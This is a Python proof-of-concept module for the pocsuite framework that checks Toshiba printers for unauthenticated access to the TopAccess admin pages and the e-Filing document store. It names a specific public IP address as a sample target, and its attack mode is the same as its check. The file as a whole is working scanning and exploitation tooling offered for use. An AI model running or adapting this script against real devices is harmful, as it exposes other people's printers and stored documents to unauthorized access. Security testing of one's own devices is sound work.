#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from urlparse import urlparse, urljoin
from pocsuite.api.request import req

class TestPOC(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'co0ontty'
    vulDate = '2019-10-18'
    createDate = '2019-10-18'
    updateDate = '2019-10-18'
    references = ['']
    name = '东芝打印机越权访问漏洞'
    appPowerLink = 'https://www.toshiba.com.cn/service/'
    appName = 'TOSHIBA'
    appVersion = ''
    vulType = '越权访问'
    desc = '''
    '''
    samples = ['http://70.31.144.155:8080']
    install_requires = ['']


    def _verify(self):
        result = {}
        target = urljoin(self.url,"/TopAccess/default.htm")
        e_filing_url = urljoin(self.url,'/e-FilingBox/efb.asp?')
        resp = req.get(target)
        e_filing_resp = req.get(e_filing_url)
        verify_list = ['TopAccess','Device/Device.htm','Device/SubMenu.htm','e-Filing']
        e_filing_verify_list = ['View','Edit','File']
        if  resp.status_code == 200 and any(_ in resp.text for _ in verify_list) and e_filing_resp.status_code == 200 and any(_ in e_filing_resp.text for _ in e_filing_verify_list)  :
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['HOME_URL'] = target
            result['VerifyInfo']['CONTROL_URL'] = e_filing_url
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
